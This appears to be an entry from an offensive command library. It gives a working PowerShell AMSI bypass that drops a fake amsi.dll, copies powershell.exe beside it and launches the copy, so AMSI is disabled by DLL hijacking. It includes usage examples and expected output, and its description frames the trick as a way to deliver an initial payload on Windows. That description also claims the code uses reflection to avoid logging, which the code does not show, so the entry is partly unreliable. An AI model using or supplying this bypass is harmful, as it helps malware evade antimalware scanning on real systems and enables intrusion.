---
id: cf08d6d6-a818-45de-91f6-3713c7bdd205
name: powershell-bypass-amsi-dll-hijack
type: command
executor: powershell
data: >-
  [Byte[]] $temp = $DllBytes -split ' '

  Write-Output "Executing the bypass."

  Write-Verbose "Dropping the fake amsi.dll to disk."

  [System.IO.File]::WriteAllBytes("$pwd\amsi.dll", $temp)


  Write-Verbose "Copying powershell.exe to the current working directory."

  Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  -Destination $pwd


  Write-Verbose "Starting powershell.exe from the current working directory."

  & "$pwd\powershell.exe"
output: null
created_at: '2023-04-06T03:56:26.063485+00:00'
updated_at: '2023-04-10T20:36:16.947963+00:00'
platforms:
  - Windows
tags:
  - amsi-bypass
  - dll-hijack
verified: true
validated: true
---

# powershell-bypass-amsi-dll-hijack

## Command

```powershell
[Byte[]] $temp = $DllBytes -split ' '
Write-Output "Executing the bypass."
Write-Verbose "Dropping the fake amsi.dll to disk."
[System.IO.File]::WriteAllBytes("$pwd\amsi.dll", $temp)

Write-Verbose "Copying powershell.exe to the current working directory."
Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Destination $pwd

Write-Verbose "Starting powershell.exe from the current working directory."
& "$pwd\powershell.exe"
```

## Description

This PowerShell command implements an AMSI bypass by dropping a fake amsi.dll to the current directory and hijacking the DLL load path of a copied powershell.exe instance. It uses reflection principles to avoid WMF logging. Use this in scenarios where AMSI blocks script execution, such as during initial payload delivery on Windows systems.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $DllBytes | Byte array (as space-separated string) representing the fake amsi.dll content | Yes |
| $pwd | Current working directory (automatic in PowerShell) | No |
| C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Path to source PowerShell executable | No (assumed default) |

## Examples

### Basic Usage

Pre-define $DllBytes, then run the script in PowerShell:

```powershell
$DllBytes = "48 65 6c 6c 6f ..."  # Example bytes for fake DLL
[Byte[]] $temp = $DllBytes -split ' '
# ... rest of script
```

### Advanced Usage

Integrate into a larger script with error handling:

```powershell
try {
    # Define $DllBytes here
    # Run the bypass script
} catch {
    Write-Error "Bypass failed: $_"
}
```

## Expected Output

The command outputs verbose messages indicating progress:

```
Executing the bypass.
VERBOSE: Dropping the fake amsi.dll to disk.
VERBOSE: Copying powershell.exe to the current working directory.
VERBOSE: Starting powershell.exe from the current working directory.
```

A new PowerShell window opens without AMSI enabled. No errors if files are written successfully; check $pwd for amsi.dll and powershell.exe copies.

## Related

- [[procedures/Bypass-AMSI-via-DLL-Hijacking-and-Reflection]]
- [[codes/PowerShell-AMSI-Bypass-via-DLL-Hijack]]
